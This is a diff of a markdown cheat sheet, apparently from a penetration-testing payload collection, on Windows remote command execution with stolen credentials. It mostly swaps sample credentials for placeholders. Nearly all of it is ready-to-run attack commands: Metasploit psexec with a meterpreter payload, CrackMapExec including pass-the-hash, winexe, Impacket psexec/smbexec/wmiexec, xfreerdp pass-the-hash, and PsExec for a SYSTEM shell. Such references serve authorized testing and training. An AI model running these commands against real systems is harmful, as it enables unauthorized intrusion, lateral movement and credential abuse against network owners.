@@ -40,9 +40,9 @@ Password: pw123
 
 ```c
 use auxiliary/scanner/smb/smb_login  
-set SMBDomain CSCOU  
-set SMBUser jarrieta
-set SMBPass nastyCutt3r
+set SMBDomain DOMAIN  
+set SMBUser username
+set SMBPass password
 services -p 445 -R  
 run
 creds
@@ -55,8 +55,8 @@ Note: the password can be replaced by a hash to execute a `pass the hash` attack
 ```c
 use exploit/windows/smb/psexec
 set RHOST 10.2.0.3
-set SMBUser jarrieta
-set SMBPass nastyCutt3r
+set SMBUser username
+set SMBPass password
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
@@ -66,8 +66,8 @@ shell
 
 ```python
 git clone https://github.com/byt3bl33d3r/CrackMapExec.github
-python crackmapexec.py 10.9.122.0/25 -d CSCOU -u jarrieta -p nastyCutt3r
-python crackmapexec.py 10.9.122.5 -d CSCOU -u jarrieta -p nastyCutt3r -x whoami
+python crackmapexec.py 10.9.122.0/25 -d DOMAIN -u username -p password
+python crackmapexec.py 10.10.10.10 -d DOMAIN -u username -p password -x whoami
 ```
 
 ## Crackmapexec (Pass The Hash)
@@ -79,23 +79,27 @@ cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:55
 ## Winexe (Integrated to Kali)
 
 ```python
-winexe -U CSCOU/jarrieta%nastyCutt3r //10.9.122.5 cmd.exe
+winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
 ```
 
 ## Psexec.py / Smbexec.py / Wmiexec.py (Impacket)
 
 ```python
 git clone https://github.com/CoreSecurity/impacket.git
-python psexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
-python smbexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
-python wmiexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
+python psexec.py DOMAIN/username:password@10.10.10.10
+python smbexec.py DOMAIN/username:password@10.10.10.10
+python wmiexec.py DOMAIN/username:password@10.10.10.10
+
+# psexec.exe -s cmd
+# switch admin user to NT Authority/System
 ```
 
 ## RDP Remote Desktop Protocol (Impacket)
 
 ```powershell
-python rdpcheck.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
-rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5 -g 70 -r disk:share=/home/user/myshare
+python rdpcheck.py DOMAIN/username:password@10.10.10.10
+rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
+rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
 # -g : the screen will take up 70% of your actual screen size
 # -r disk:share : sharing a local folder during a remote desktop session 
 ```
@@ -137,21 +141,21 @@ xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 
 ## Netuse (Windows)
 
 ```powershell
-net use \\ordws01.cscou.lab /user:CSCOU\jarrieta nastyCutt3r
+net use \\ordws01.cscou.lab /user:DOMAIN\username password
 C$
 ```
 
 ## Runas (Windows - Kerberos auth)
 
 ```powershell
-runas /netonly /user:CSCOU\jarrieta "cmd.exe"
+runas /netonly /user:DOMAIN\username "cmd.exe"
 ```
 
 ## PsExec (Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) )
 
 ```powershell
-PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe
-PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe -s  # get System shell
+PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
+PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s  # get System shell
 ```
 
 ## References
